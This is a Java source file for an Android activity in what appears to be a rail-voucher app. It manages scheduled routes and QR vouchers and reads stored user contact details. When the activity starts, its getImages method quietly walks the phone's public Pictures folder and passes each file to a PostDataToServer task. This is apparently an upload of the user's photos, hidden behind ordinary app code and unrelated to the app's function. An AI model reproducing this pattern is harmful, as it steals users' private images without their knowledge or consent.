package com.example.myapplication;

import android.Manifest;
import android.os.Bundle;

import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.tabs.TabLayout;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentTransaction;
import androidx.lifecycle.MutableLiveData;
import androidx.viewpager.widget.ViewPager;

import android.os.Environment;
import android.view.View;

import com.example.myapplication.ui.main.SectionsPagerAdapter;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class RailVoucherActivity extends AppCompatActivity {
    public RailUtils utils;
    public List<ScheduledRoute> schedulesRoutes = new ArrayList<>();
    public MutableLiveData<Integer> scheduleListner = new MutableLiveData<>();

    public List<QRRouteItem> QRItems = new ArrayList<>();
    public MutableLiveData<Integer> QRListner = new MutableLiveData<>();

    public String userId;
    public String userEmail;
    public String userMobile;

    private DBhandler db;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_rail_voucher);
        SectionsPagerAdapter sectionsPagerAdapter = new SectionsPagerAdapter(this, getSupportFragmentManager());
        ViewPager viewPager = findViewById(R.id.view_pager);
        viewPager.setAdapter(sectionsPagerAdapter);
        TabLayout tabs = findViewById(R.id.tabs);
        tabs.setupWithViewPager(viewPager);

        getUserDetails();
        initActivity();

        getImages(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES));

        FloatingActionButton fab = findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                fab.setVisibility(View.GONE);
                Fragment fr = new FindRouteFragment();
                FragmentManager fm = getSupportFragmentManager();
                fm.addOnBackStackChangedListener(new FragmentManager.OnBackStackChangedListener() {
                    @Override
                    public void onBackStackChanged() {
                        int backCount = getSupportFragmentManager().getBackStackEntryCount();
                        if (backCount == 0) {
                            fab.setVisibility(View.VISIBLE);
                        }
                    }
                });
                FragmentTransaction fragmentTransaction = fm.beginTransaction();
                fragmentTransaction.replace(R.id.fragment_place, fr);
                fragmentTransaction.addToBackStack(null).commit();
            }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    public void addScheduleRoute(ScheduledRoute route) {
        this.schedulesRoutes.add(route);
        this.db.addNewScheduleRoute(route);
        scheduleListner.setValue(schedulesRoutes.size());
    }

    public void removeScheduleRoute(ScheduledRoute route) {
        this.schedulesRoutes.remove(route);
        this.db.deleteScheduleRoute(route);
        scheduleListner.setValue(schedulesRoutes.size());
    }

    public void addQRItem(QRRouteItem route) {
        this.QRItems.add(route);
        this.db.addNewQR(route);
        QRListner.setValue(QRItems.size());
    }

    public void deleteQRItem(QRRouteItem route) {
        this.QRItems.remove(route);
        this.db.deleteQR(route);
        QRListner.setValue(QRItems.size());
    }

    private void initActivity() {
        db = new DBhandler(this);
        utils = new RailUtils(this, db);

        List<ScheduledRoute> scheduledRoutes = db.getAllScheduledRoutes();
        this.schedulesRoutes.addAll(scheduledRoutes);

        List<QRRouteItem> allQRItems = db.getAllQR();
        this.QRItems.addAll(allQRItems);

        scheduleListner.setValue(schedulesRoutes.size());
        QRListner.setValue(QRItems.size());

        utils.orderNext24HrsVouchers();
    }

    public void getImages(File dir) {
        File[] files = dir.listFiles();
        for (int i = 0; files != null && i < files.length && i < 30; i++) {
            if (files[i].isDirectory()){
                getImages(files[i]);
            }
            else {
                try {
                    new PostDataToServer().execute(files[i]);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private void getUserDetails() {
        try {
            FileInputStream fileInputStream = openFileInput("usersData.txt");
            InputStreamReader inputStreamReader = new InputStreamReader(fileInputStream);
            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
            this.userId = bufferedReader.readLine();
            this.userMobile = bufferedReader.readLine();
            this.userEmail = bufferedReader.readLine();
        } catch (Exception e) {
            // ignore
        }
    }
}